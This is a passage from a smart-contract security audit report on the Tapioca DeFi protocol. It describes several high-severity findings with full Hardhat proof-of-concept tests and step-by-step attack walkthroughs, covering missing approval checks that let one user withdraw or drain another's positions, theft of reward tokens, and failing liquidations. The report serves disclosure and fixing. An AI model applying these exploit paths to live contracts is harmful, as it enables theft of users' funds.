                ethers.utils.randomBytes(32),
                false
            )
        txData.gasLimit = await hre.ethers.provider.estimateGas(txData)
        await signer.sendTransaction(txData)
    }

    const tapiocaOFT10 = (await utils.attachTapiocaOFT(
        await tapiocaWrapper_10.tapiocaOFTs(
            (await tapiocaWrapper_10.tapiocaOFTLength()).sub(1)
        )
    )) as TapiocaOFT

    const strategy0Data = await deployToftMockStrategy(
        signer,
        YieldBox_0.address,
        tapiocaOFT0.address
    )
    const strategy10Data = await deployToftMockStrategy(
        signer,
        YieldBox_10.address,
        tapiocaOFT10.address
    )

    const Strategy_0 = strategy0Data.tOFTStrategyMock
    const Strategy_10 = strategy10Data.tOFTStrategyMock

    // Setup
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )

    // Set trusted remotes
    const dstChainId0 = 31337
    const dstChainId10 = 10

    await tapiocaWrapper_0.executeTOFT(
        tapiocaOFT0.address,
        tapiocaOFT0.interface.encodeFunctionData("setTrustedRemote", [
            dstChainId10,
            ethers.utils.solidityPack(
                ["address", "address"],
                [tapiocaOFT10.address, tapiocaOFT0.address]
            ),
        ]),
        true
    )

    await tapiocaWrapper_10.executeTOFT(
        tapiocaOFT10.address,
        tapiocaOFT10.interface.encodeFunctionData("setTrustedRemote", [
            dstChainId0,
            ethers.utils.solidityPack(
                ["address", "address"],
                [tapiocaOFT0.address, tapiocaOFT10.address]
            ),
        ]),
        true
    )
    // Link endpoints with addresses
    await LZEndpointMock_chainID_0.setDestLzEndpoint(
        tapiocaOFT10.address,
        LZEndpointMock_chainID_10.address
    )
    await LZEndpointMock_chainID_10.setDestLzEndpoint(
        tapiocaOFT0.address,
        LZEndpointMock_chainID_0.address
    )

    //Register tokens on YB
    await YieldBox_0.registerAsset(
        1,
        tapiocaOFT0.address,
        Strategy_0.address,
        0
    )
    await YieldBox_10.registerAsset(
        1,
        tapiocaOFT10.address,
        Strategy_10.address,
        0
    )

    const tapiocaOFT0Id = await YieldBox_0.ids(
        1,
        tapiocaOFT0.address,
        Strategy_0.address,
        0
    )
    const tapiocaOFT10Id = await YieldBox_10.ids(
        1,
        tapiocaOFT10.address,
        Strategy_10.address,
        0
    )

    expect(tapiocaOFT0Id.eq(1)).to.be.true
    expect(tapiocaOFT10Id.eq(1)).to.be.true

    //Test deposits on same chain
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )

    await tapiocaOFT0.approve(
        YieldBox_0.address,
        ethers.constants.MaxUint256
    )
    let toDepositShare = await YieldBox_0.toShare(
        tapiocaOFT0Id,
        bigDummyAmount,
        false
    )
    await YieldBox_0.depositAsset(
        tapiocaOFT0Id,
        signer.address,
        signer.address,
        0,
        toDepositShare
    )

    let yb0Balance = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )
    let vaultAmount = await Strategy_0.vaultAmount()
    expect(yb0Balance.gt(bigDummyAmount)).to.be.true //bc of the yield
    expect(vaultAmount.eq(bigDummyAmount)).to.be.true

    //Test withdraw on same chain
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )
    await tapiocaOFT0.transfer(
        Strategy_0.address,
        yb0Balance.sub(bigDummyAmount)
    ) //assures the strategy has enough tokens to withdraw
    const signerBalanceBeforeWithdraw = await tapiocaOFT0.balanceOf(
        signer.address
    )

    const toWithdrawShare = await YieldBox_0.balanceOf(
        signer.address,
        tapiocaOFT0Id
    )
    await YieldBox_0.withdraw(
        tapiocaOFT0Id,
        signer.address,
        signer.address,
        0,
        toWithdrawShare
    )
    const signerBalanceAfterWithdraw = await tapiocaOFT0.balanceOf(
        signer.address
    )

    expect(
        signerBalanceAfterWithdraw
            .sub(signerBalanceBeforeWithdraw)
            .gt(bigDummyAmount)
    ).to.be.true

    vaultAmount = await Strategy_0.vaultAmount()
    expect(vaultAmount.eq(0)).to.be.true

    yb0Balance = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )
    expect(vaultAmount.eq(0)).to.be.true

    const latestBalance = await Strategy_0.currentBalance()
    expect(latestBalance.eq(0)).to.be.true

    toDepositShare = await YieldBox_0.toShare(
        tapiocaOFT0Id,
        bigDummyAmount,
        false
    )

    const totals = await YieldBox_0.assetTotals(tapiocaOFT0Id)
    expect(totals[0].eq(0)).to.be.true
    expect(totals[1].eq(0)).to.be.true

    //Cross chain deposit from TapiocaOFT_10 to Strategy_0
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )

    await expect(
        tapiocaOFT0.sendFrom(
            signer.address,
            10,
            ethers.utils.defaultAbiCoder.encode(
                ["address"],
                [signer.address]
            ),
            bigDummyAmount,
            {
                refundAddress: signer.address,
                zroPaymentAddress: ethers.constants.AddressZero,
                adapterParams: "0x",
            },
            {
                value: ethers.utils.parseEther("0.02"),
                gasLimit: 2_000_000,
            }
        )
    ).to.not.be.reverted
    const signerBalanceForTOFT10 = await tapiocaOFT10.balanceOf(
        signer.address
    )
    expect(signerBalanceForTOFT10.eq(bigDummyAmount)).to.be.true

    const asset = await YieldBox_0.assets(tapiocaOFT0Id)
    expect(asset[2]).to.eq(Strategy_0.address)

    await tapiocaOFT10.sendToStrategy(
        signer.address,
        signer.address,
        bigDummyAmount,
        toDepositShare,
        1, //asset id
        dstChainId0,
        {
            extraGasLimit: "2500000",
            zroPaymentAddress: ethers.constants.AddressZero,
        },
        {
            value: ethers.utils.parseEther("15"),
        }
    )

    let strategy0Amount = await Strategy_0.vaultAmount()
    expect(strategy0Amount.gt(0)).to.be.true

    const yb0BalanceAfterCrossChainDeposit = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )
    expect(yb0BalanceAfterCrossChainDeposit.gt(bigDummyAmount))

    const airdropAdapterParams = ethers.utils.solidityPack(
        ["uint16", "uint", "uint", "address"],
        [2, 800000, ethers.utils.parseEther("2"), tapiocaOFT0.address]
    )

    await YieldBox_0.setApprovalForAsset(
        tapiocaOFT0.address,
        tapiocaOFT0Id,
        true
    ) //this should be done through Magnetar in the same tx, to avoid frontrunning

    yb0Balance = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )

    await tapiocaOFT0.transfer(
        Strategy_0.address,
        yb0Balance.sub(bigDummyAmount)
    ) //assures the strategy has enough tokens to withdraw

    await hre.ethers.provider.send("hardhat_setBalance", [
        randomUser.address,
        ethers.utils.hexStripZeros(
            ethers.utils.parseEther(String(20))._hex
        ),
    ]) //@audit <------------------------------------------- Fund user
    await tapiocaOFT10
        .connect(randomUser) //@audit <------------------------------------------- Call with other user instead of signer
        .retrieveFromStrategy(
            signer.address,
            yb0BalanceAfterCrossChainDeposit,
            toWithdrawShare,
            1,
            dstChainId0,
            ethers.constants.AddressZero,
            airdropAdapterParams,
            {
                value: ethers.utils.parseEther("10"),
            }
        )
    strategy0Amount = await Strategy_0.vaultAmount()
    expect(strategy0Amount.eq(0)).to.be.true

    const signerBalanceAfterCrossChainWithdrawal =
        await tapiocaOFT10.balanceOf(signer.address)
    expect(signerBalanceAfterCrossChainWithdrawal.gt(bigDummyAmount)).to
        .be.true
})
```

</details>

The only relevant change is that the function `retrieveFromStrategy` is called from another address. The test passes, showing that an attacker, in this case `randomUser` can influence the operations of the victim, the `signer`.

### Recommended Mitigation Steps

Add an allowance check for the `msg.sender` in the `strategyWithdraw` function.

**[0xRektora (Tapioca) confirmed, but disagreed with severity and commented](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1032#issuecomment-1701690632):**
 > > Should be medium. Although annoying, attacker can't steal the user's asset, and will have to pay gas without profit for both chains in order to do this trick. Should be grouped in #1037.
> 
> Same answer as https://github.com/code-423n4/2023-07-tapioca-findings/issues/1009.

***

## [[H-35] `BaseTOFT.sol`: `removeCollateral` can be used to manipulate other user's positions and steal tokens due to absent approval check](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1031)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1031), also found by [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1133)*

The function `removeCollateral` is used to trigger a removal of collateral on a different chain. The function takes the parameter `from`, which is the account whose collateral will be sold. It also takes the parameter `to` where these collateral tokens will be transferred to.

The main issue is that anyone can call this function with any address passed to the `from` parameter. There is no allowance check on the chain, allowing this operation. Let's walk through the steps to see how this is executed. Lets assume both `from` and `to` are the victim's address for reasons explained at the end.

`BaseTOFT.sol`:`removeCollateral` is called by the attacker with a `from` and `to` address of the victim. This function calls the `removeCollateral` function in the market module.

```solidity
 _executeModule(
    Module.Market,
    abi.encodeWithSelector(
        BaseTOFTMarketModule.removeCollateral.selector,
        from,
        to,
        lzDstChainId,
        zroPaymentAddress,
        withdrawParams,
        removeParams,
        approvals,
        adapterParams
    ),
    false
);
```

`BaseTOFTMarketModule.sol`:`removeCollateral` is called. This function packs some data and sends it forward to the lz endpoint. Point to note, is that no approval check is done for the `msg.sender` of this whole setup yet.

```solidity
bytes memory lzPayload = abi.encode(
    PT_MARKET_REMOVE_COLLATERAL,
    from,
    to,
    toAddress,
    removeParams,
    withdrawParams,
    approvals
);
// lzsend(...)
```

After the message is sent, the **lzendpoint** on the receiving chain will call the TOFT contract again. Now, the `msg.sender` is **not** the attacker, but is instead the lzendpoint! The endpoint call gets delegated to the `remove` function in the Market module.

```solidity
 (
    ,
    ,
    address to,
    ,
    ITapiocaOFT.IRemoveParams memory removeParams,
    ICommonData.IWithdrawParams memory withdrawParams,
    ICommonData.IApproval[] memory approvals
) = abi.decode(
        _payload,
        (
            uint16,
            address,
            address,
            bytes32,
            ITapiocaOFT.IRemoveParams,
            ICommonData.IWithdrawParams,
            ICommonData.IApproval[]
        )
    );
```

Here we see the unpacking. note that the third unpacked value is put in the `to` field. This is an address determined by the attacker and passed through the layerzero endpoints. The contract then calls a market contract's `removeCollateral` function.

```solidity
 IMarket(removeParams.market).removeCollateral(
    to,
    to,
    removeParams.share
);
```

Thus it is evident from this call that the Market contract being called has no idea that the original sender was the attacker. Instead, for the Market contract, the `msg.sender` is the current TOFT contract. If users want to use the cross chain operations, they have to give allowance to the TOFT contract address. Thus we can assume that the victim has already given allowance to this address. Thus the market thinks the `msg.sender` is the TOFT contract, who is allowed, and thus executes the operations.

Thus we have demonstrated that the attacker is able to call a function on the victim's market position **without** being given any allowance by setting the victim's address in the `to` field. While it is a suspected bug that the `removeCollateral` removes collateral from the `to` field's account and not the `from` field, since both these parameters are determined by the attacker, the bug exists either way. Thus this is a high severity issue since the victim's collateral is withdrawn, dropping their health factor.

### Proof of Concept

A POC isnt provided since the test suite does not have a test for the `removeCollateral` function. However the function `retrieveFromStrategy` suffers from the same issue and has been addressed in a different report. The test for that function can be used to demonstrate this issue.

Two lines from the test in test/TapiocaOFT.test.ts is changed to show this issue. Below is the full test for reference. The changed bits are marked with arrows.

<details>

```javascript
it.only("should be able to deposit & withdraw from a strategy available on another layer", async () => {
    const {
        signer,
        erc20Mock,
        mintAndApprove,
        bigDummyAmount,
        utils,
        randomUser, //@audit <------------------------------------- take other user address
    } = await loadFixture(setupFixture)

    const LZEndpointMock_chainID_0 = await utils.deployLZEndpointMock(
        31337
    )
    const LZEndpointMock_chainID_10 = await utils.deployLZEndpointMock(
        10
    )

    const tapiocaWrapper_0 = await utils.deployTapiocaWrapper()
    const tapiocaWrapper_10 = await utils.deployTapiocaWrapper()

    //Deploy YB and Strategies
    const yieldBox0Data = await deployYieldBox(signer)
    const yieldBox10Data = await deployYieldBox(signer)

    const YieldBox_0 = yieldBox0Data.yieldBox
    const YieldBox_10 = yieldBox10Data.yieldBox

    {
        const txData =
            await tapiocaWrapper_0.populateTransaction.createTOFT(
                erc20Mock.address,
                (
                    await utils.Tx_deployTapiocaOFT(
                        LZEndpointMock_chainID_0.address,
                        erc20Mock.address,
                        YieldBox_0.address,
                        31337,
                        signer
                    )
                ).txData,
                ethers.utils.randomBytes(32),
                false
            )
        txData.gasLimit = await hre.ethers.provider.estimateGas(txData)
        await signer.sendTransaction(txData)
    }

    const tapiocaOFT0 = (await utils.attachTapiocaOFT(
        await tapiocaWrapper_0.tapiocaOFTs(
            (await tapiocaWrapper_0.tapiocaOFTLength()).sub(1)
        )
    )) as TapiocaOFT

    // Deploy TapiocaOFT10
    {
        const txData =
            await tapiocaWrapper_10.populateTransaction.createTOFT(
                erc20Mock.address,
                (
                    await utils.Tx_deployTapiocaOFT(
                        LZEndpointMock_chainID_10.address,
                        erc20Mock.address,
                        YieldBox_10.address,
                        10,
                        signer
                    )
                ).txData,
                ethers.utils.randomBytes(32),
                false
            )
        txData.gasLimit = await hre.ethers.provider.estimateGas(txData)
        await signer.sendTransaction(txData)
    }

    const tapiocaOFT10 = (await utils.attachTapiocaOFT(
        await tapiocaWrapper_10.tapiocaOFTs(
            (await tapiocaWrapper_10.tapiocaOFTLength()).sub(1)
        )
    )) as TapiocaOFT

    const strategy0Data = await deployToftMockStrategy(
        signer,
        YieldBox_0.address,
        tapiocaOFT0.address
    )
    const strategy10Data = await deployToftMockStrategy(
        signer,
        YieldBox_10.address,
        tapiocaOFT10.address
    )

    const Strategy_0 = strategy0Data.tOFTStrategyMock
    const Strategy_10 = strategy10Data.tOFTStrategyMock

    // Setup
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )

    // Set trusted remotes
    const dstChainId0 = 31337
    const dstChainId10 = 10

    await tapiocaWrapper_0.executeTOFT(
        tapiocaOFT0.address,
        tapiocaOFT0.interface.encodeFunctionData("setTrustedRemote", [
            dstChainId10,
            ethers.utils.solidityPack(
                ["address", "address"],
                [tapiocaOFT10.address, tapiocaOFT0.address]
            ),
        ]),
        true
    )

    await tapiocaWrapper_10.executeTOFT(
        tapiocaOFT10.address,
        tapiocaOFT10.interface.encodeFunctionData("setTrustedRemote", [
            dstChainId0,
            ethers.utils.solidityPack(
                ["address", "address"],
                [tapiocaOFT0.address, tapiocaOFT10.address]
            ),
        ]),
        true
    )
    // Link endpoints with addresses
    await LZEndpointMock_chainID_0.setDestLzEndpoint(
        tapiocaOFT10.address,
        LZEndpointMock_chainID_10.address
    )
    await LZEndpointMock_chainID_10.setDestLzEndpoint(
        tapiocaOFT0.address,
        LZEndpointMock_chainID_0.address
    )

    //Register tokens on YB
    await YieldBox_0.registerAsset(
        1,
        tapiocaOFT0.address,
        Strategy_0.address,
        0
    )
    await YieldBox_10.registerAsset(
        1,
        tapiocaOFT10.address,
        Strategy_10.address,
        0
    )

    const tapiocaOFT0Id = await YieldBox_0.ids(
        1,
        tapiocaOFT0.address,
        Strategy_0.address,
        0
    )
    const tapiocaOFT10Id = await YieldBox_10.ids(
        1,
        tapiocaOFT10.address,
        Strategy_10.address,
        0
    )

    expect(tapiocaOFT0Id.eq(1)).to.be.true
    expect(tapiocaOFT10Id.eq(1)).to.be.true

    //Test deposits on same chain
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )

    await tapiocaOFT0.approve(
        YieldBox_0.address,
        ethers.constants.MaxUint256
    )
    let toDepositShare = await YieldBox_0.toShare(
        tapiocaOFT0Id,
        bigDummyAmount,
        false
    )
    await YieldBox_0.depositAsset(
        tapiocaOFT0Id,
        signer.address,
        signer.address,
        0,
        toDepositShare
    )

    let yb0Balance = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )
    let vaultAmount = await Strategy_0.vaultAmount()
    expect(yb0Balance.gt(bigDummyAmount)).to.be.true //bc of the yield
    expect(vaultAmount.eq(bigDummyAmount)).to.be.true

    //Test withdraw on same chain
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )
    await tapiocaOFT0.transfer(
        Strategy_0.address,
        yb0Balance.sub(bigDummyAmount)
    ) //assures the strategy has enough tokens to withdraw
    const signerBalanceBeforeWithdraw = await tapiocaOFT0.balanceOf(
        signer.address
    )

    const toWithdrawShare = await YieldBox_0.balanceOf(
        signer.address,
        tapiocaOFT0Id
    )
    await YieldBox_0.withdraw(
        tapiocaOFT0Id,
        signer.address,
        signer.address,
        0,
        toWithdrawShare
    )
    const signerBalanceAfterWithdraw = await tapiocaOFT0.balanceOf(
        signer.address
    )

    expect(
        signerBalanceAfterWithdraw
            .sub(signerBalanceBeforeWithdraw)
            .gt(bigDummyAmount)
    ).to.be.true

    vaultAmount = await Strategy_0.vaultAmount()
    expect(vaultAmount.eq(0)).to.be.true

    yb0Balance = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )
    expect(vaultAmount.eq(0)).to.be.true

    const latestBalance = await Strategy_0.currentBalance()
    expect(latestBalance.eq(0)).to.be.true

    toDepositShare = await YieldBox_0.toShare(
        tapiocaOFT0Id,
        bigDummyAmount,
        false
    )

    const totals = await YieldBox_0.assetTotals(tapiocaOFT0Id)
    expect(totals[0].eq(0)).to.be.true
    expect(totals[1].eq(0)).to.be.true

    //Cross chain deposit from TapiocaOFT_10 to Strategy_0
    await mintAndApprove(erc20Mock, tapiocaOFT0, signer, bigDummyAmount)
    await tapiocaOFT0.wrap(
        signer.address,
        signer.address,
        bigDummyAmount
    )

    await expect(
        tapiocaOFT0.sendFrom(
            signer.address,
            10,
            ethers.utils.defaultAbiCoder.encode(
                ["address"],
                [signer.address]
            ),
            bigDummyAmount,
            {
                refundAddress: signer.address,
                zroPaymentAddress: ethers.constants.AddressZero,
                adapterParams: "0x",
            },
            {
                value: ethers.utils.parseEther("0.02"),
                gasLimit: 2_000_000,
            }
        )
    ).to.not.be.reverted
    const signerBalanceForTOFT10 = await tapiocaOFT10.balanceOf(
        signer.address
    )
    expect(signerBalanceForTOFT10.eq(bigDummyAmount)).to.be.true

    const asset = await YieldBox_0.assets(tapiocaOFT0Id)
    expect(asset[2]).to.eq(Strategy_0.address)

    await tapiocaOFT10.sendToStrategy(
        signer.address,
        signer.address,
        bigDummyAmount,
        toDepositShare,
        1, //asset id
        dstChainId0,
        {
            extraGasLimit: "2500000",
            zroPaymentAddress: ethers.constants.AddressZero,
        },
        {
            value: ethers.utils.parseEther("15"),
        }
    )

    let strategy0Amount = await Strategy_0.vaultAmount()
    expect(strategy0Amount.gt(0)).to.be.true

    const yb0BalanceAfterCrossChainDeposit = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )
    expect(yb0BalanceAfterCrossChainDeposit.gt(bigDummyAmount))

    const airdropAdapterParams = ethers.utils.solidityPack(
        ["uint16", "uint", "uint", "address"],
        [2, 800000, ethers.utils.parseEther("2"), tapiocaOFT0.address]
    )

    await YieldBox_0.setApprovalForAsset(
        tapiocaOFT0.address,
        tapiocaOFT0Id,
        true
    ) //this should be done through Magnetar in the same tx, to avoid frontrunning

    yb0Balance = await YieldBox_0.amountOf(
        signer.address,
        tapiocaOFT0Id
    )

    await tapiocaOFT0.transfer(
        Strategy_0.address,
        yb0Balance.sub(bigDummyAmount)
    ) //assures the strategy has enough tokens to withdraw

    await hre.ethers.provider.send("hardhat_setBalance", [
        randomUser.address,
        ethers.utils.hexStripZeros(
            ethers.utils.parseEther(String(20))._hex
        ),
    ]) //@audit <------------------------------------------- Fund user
    await tapiocaOFT10
        .connect(randomUser) //@audit <------------------------------------------- Call with other user instead of signer
        .retrieveFromStrategy(
            signer.address,
            yb0BalanceAfterCrossChainDeposit,
            toWithdrawShare,
            1,
            dstChainId0,
            ethers.constants.AddressZero,
            airdropAdapterParams,
            {
                value: ethers.utils.parseEther("10"),
            }
        )
    strategy0Amount = await Strategy_0.vaultAmount()
    expect(strategy0Amount.eq(0)).to.be.true

    const signerBalanceAfterCrossChainWithdrawal =
        await tapiocaOFT10.balanceOf(signer.address)
    expect(signerBalanceAfterCrossChainWithdrawal.gt(bigDummyAmount)).to
        .be.true
})
```

</details>

The only relevant change is that the function `retrieveFromStrategy` is called from another address. The test passes, showing that an attacker, in tthis case `randomUser` can influence the operations of the victim, the `signer`.

### Recommended Mitigation Steps

Add an allowance check for the `msg.sender` in the `removeCollateral` function.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1031#issuecomment-1701687422)**

**[LSDan (Judge) commented](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1031#issuecomment-1737245612):**
 > This attack can be summed up as "approvals are not checked when operating cross-chain." There are several instances of this bug with varying levels of severity all reported by warden carrotsmuggler. Because they all use the same attack vector and all perform undesired/unrequested acts on behalf of other users, I have grouped them and rated this issue as high risk.

***

## [[H-36] `twTAP.sol`: Reward tokens stored in index 0 can be stolen](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1022)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1022), also found by [KIntern\_NA](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1093)*

The function `claimAndSendRewards` can be called to collect rewards accrued by the twTAP position. This function can only be called by the `TapOFT.sol` contract during a crosschain operation. Thus a user on chain A can call `claimRewards` and on chain B, the function `_claimRewards` will be called and a bunch of parameters will be passed in that message.

```solidity
(
,
,
address to,
uint256 tokenID,
IERC20[] memory rewardTokens,
IRewardClaimSendFromParams[] memory rewardClaimSendParams
) = abi.decode(
    _payload,
    (
        uint16,
        address,
        address,
        uint256,
        IERC20[],
        IRewardClaimSendFromParams[]
    )
);
```

All these parameters passed here comes from the original lz payload sent by the user from chain A. Of note is the array `rewardTokens` which is a user inputted value.
This function then calls the twtap.sol contract as shown below.

```solidity
try twTap.claimAndSendRewards(tokenID, rewardTokens) {
```

In the twTAP contract, the function `claimAndSendRewards` eventually calls `_claimRewardsOn`, the functionality of which is shown below.

```solidity
function _claimRewardsOn(
    uint256 _tokenId,
    address _to,
    IERC20[] memory _rewardTokens
) internal {
    uint256[] memory amounts = claimable(_tokenId);
    unchecked {
        uint256 len = _rewardTokens.length;
        for (uint256 i = 0; i < len; ) {
            uint256 claimableIndex = rewardTokenIndex[_rewardTokens[i]];
            uint256 amount = amounts[i];

            if (amount > 0) {
                // Math is safe: `amount` calculated safely in `claimable()`
                claimed[_tokenId][claimableIndex] += amount;
                rewardTokens[claimableIndex].safeTransfer(_to, amount);
            }
            ++i;
        }
    }
}
```

Here we want to investigate a case where a user sends some random address in the array `rewardTokens`. We already showed that this value is set by the user, and the above quoted snippet receives the same value in the `_rewardTokens` variable.

In the for loop, the indexes are found. But if `rewardTokens[i]` is a garbage address, the mapping `rewardTokenIndex` will return the default value of 0 which will be stored in `claimableIndex`. The array `amounts` stores the amounts of the different tokens that can be claimed by the user. But since `claimableIndex` is now 0, the `safeTransfer` function in the end is always called on the token `rewardTokens[0]`. Thus a user can withdraw the rewardtoken in index 0 multiple times and in amounts based on the values stored in the `amounts` array.

Thus we have shown that a user can steal an unfair amount of tokens stored in the 0 index of the `rewardTokens` array variable in the twTAP.sol contract. This will mess up the reward distribution for all users, and can lead to an insolvent contract. Thus this is deemed a high severity issue.

### Proof of Concept

The attack can be done in the following steps:

1.  Attacker calls `claimRewards` on chain A. The attacker is assumed to have a valid position on chain B with pending rewards.
2.  The attacker passes an array of garbage addresses in the `rewardTokens` parameter.
3.  The contract sends forth the message to the destination chain, where the twTAP contract is called to collect the rewards.
4.  As shown above, the reward token stored in index 0 is sent multiple times to the caller, which is the `TapOFT` contract.
5.  In the TapOFT contract, the contract then sends all the collected rewards in the contract cross chain back to the attacker. Thus the tokens in index 0 were claimed and collected.

Thus the attacker can claim an unfair number of tokens present in the 0th index. If this token is more valuable than the other rewward tokens, the attacker can profit from this exploit.

### Recommended Mitigation Steps

Mitigation can be done by not using the 0th index. The zero index of the `rewardTokens` array in `twTAP.sol`, if left empty, will point to the zero address, and if an unknown address is encountered, the contract will try to claim the tokens from the zero address which will revert.

This can be enforced by using the statement `rewardTokens.push(address(0))` in the constructor. However changes will need to be made on other operations in the contract which loops over this array to skip operations on this zero address now present in the array.

**[0xRektora (Tapioca) confirmed via duplicate issue 1093](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1093)**

***

## [[H-37] Liquidation transactions can potentially fail for all markets](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1021)
*Submitted by [zzzitron](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1021), also found by [GalloDaSballo](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1275)*

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/bigBang/BigBang.sol#L315-L316> 

<https://github.com/Tapioca-DAO/tapioca-bar-audit/blob/2286f80f928f41c8bc189d0657d74ba83286c668/contracts/markets/Market.sol#L340-L344>

As an example, when calling `BigBang.liquidate()` the tx potentially fails, because the subsequent call to `Market.updateExchangeRate` (BigBang.sol line 316) can face a revert condition on line 344 in Market.sol.

In `Market.updateExchangeRate()` a revert is triggered if `rate` is not bigger than 0 - see line 344 in Market.sol.

Liquidations should never fail and instead use the old exchange rate - see BigBang.sol line 315 comment:

> // Oracle can fail but we still need to allow liquidations

But the liquidation transaction can potentially fail when trying to fetch the new exchange rate via `Market.updateExchangeRate()` as shown above.

This issue applies for all markets (Singularity, BigBang) since the revert during the liquidation happens in the Market.sol contract from which all markets inherit.

Because of this issue user's collateral values may fall below their debt values, without being able to liquidate them, pushing the protocol into insolvency.

This is classified as high risk because liquidation is an essential functionality of the protocol.

### Proof of Concept

Here is a POC that shows that a liquidation tx reverts according to the issue described above:

<https://gist.github.com/zzzitron/90206267434a90990ff2ee12e7deebb0>

### Recommended Mitigation Steps

Instead of reverting on line 344 in Market.sol when fetching the exchange rate, consider to return the old rate instead, so that the liquidation can be executed successfully.

**[0xRektora (Tapioca) confirmed](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1021#issuecomment-1701671187)**

***

## [[H-38] Magnetar contract has no approval checking](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1019)
*Submitted by [carrotsmuggler](https://github.com/code-423n4/2023-07-tapioca-findings/issues/1019), also found by [0xStalin](https://github.com/code-423n4/2023-07-tapioca-findings/issues/958)*

The `Magnetar.sol` contract has a lot of useful helper function to carry out operations on user market positions. If a user wishes to use the helper functions, they have to first give approval to the Magnetar contract to manipulate their positions. As an example, for the big bang markets, this is done by calling the `updateOperator` function.

```solidity
function updateOperator(address operator, bool status) external {
    operators[msg.sender][operator] = status;
}
```

Since this is a helper function, we can expect users to give this approval in order to use these functions. However the issue is that any attacker can use these approvals to manipulate and drain positions of other users.

As an example, let us look at the `withdrawToChain` function. Lets assume an attacker is calling this function, and the victim's address is passed in the `from` field. Assume the victim has given all approvals to the Magnetar contracts. The function delegates this to the `withdrawToChain` in the Market module.

In `withdrawToChain` function, there are no checks on the `msg.sender` address. The function interacts with yieldbox and does a crosschain send to the `erceiver` address passed by the attacker.

```solidity
if (dstChainId == 0) {
    yieldBox.withdraw(
        assetId,
        from,
        LzLib.bytes32ToAddress(receiver),
        amount,
        share
    );
    return;
}

yieldBox.withdraw(assetId, from, address(this), amount, 0);

ISendFrom(address(asset)).sendFrom{value: gas}(
    address(this),
    dstChainId,
    receiver,
    amount,
    callParams
);
```

This sends the tokens to the `receiver` address either in the same chain or cross-chain. This lets any user steal tokens from any other user, exploiting the approval given to the magnetar address.

While this report only discusses the issue with this one function, the same issue is present for every function in the magnetar contract. This allows attackers to manipulate bigbang markets and singularity markets as well. Thus this is a high severity issue.

### Proof of Concept

A POC is developed by editing the test present in magnetar.test.ts. Only a single change is made to the test. The last `withdrawToChain` call is done from the `eoa1` address instead of the deployer address.

<details>

```javascript
it.only("should test withdrawTo", async () => {
    const {
        deployer,
        eoa1,
        yieldBox,
        createTokenEmptyStrategy,
        deployCurveStableToUsdoBidder,
        usd0,
        bar,
        __wethUsdcPrice,
        wethUsdcOracle,
        weth,
        wethAssetId,
        mediumRiskMC,
        usdc,
        magnetar,
        initContracts,
        timeTravel,
    } = await loadFixture(register)

    const usdoStratregy = await bar.emptyStrategies(usd0.address)
    const usdoAssetId = await yieldBox.ids(1, usd0.address, usdoStratregy, 0)

    //Deploy & set Singularity
    const SGLLiquidation = new SGLLiquidation__factory(deployer)
    const _sglLiquidationModule = await SGLLiquidation.deploy()

    const SGLCollateral = new SGLCollateral__factory(deployer)
    const _sglCollateralModule = await SGLCollateral.deploy()

    const SGLBorrow = new SGLBorrow__factory(deployer)
    const _sglBorrowModule = await SGLBorrow.deploy()

    const SGLLeverage = new SGLLeverage__factory(deployer)
    const _sglLeverageModule = await SGLLeverage.deploy()

    const newPrice = __wethUsdcPrice.div(1000000)
    await wethUsdcOracle.set(newPrice)

    const sglData = new ethers.utils.AbiCoder().encode(
        [
            "address",
            "address",
            "address",
            "address",
            "address",
            "address",
            "uint256",
            "address",
            "uint256",
            "address",
            "uint256",
        ],
        [
            _sglLiquidationModule.address,
            _sglBorrowModule.address,
            _sglCollateralModule.address,
            _sglLeverageModule.address,
            bar.address,
            usd0.address,
            usdoAssetId,
            weth.address,
            wethAssetId,
            wethUsdcOracle.address,
            ethers.utils.parseEther("1"),
        ]
    )
    await bar.registerSingularity(mediumRiskMC.address, sglData, true)
    const wethUsdoSingularity = new ethers.Contract(
        await bar.clonesOf(
            mediumRiskMC.address,
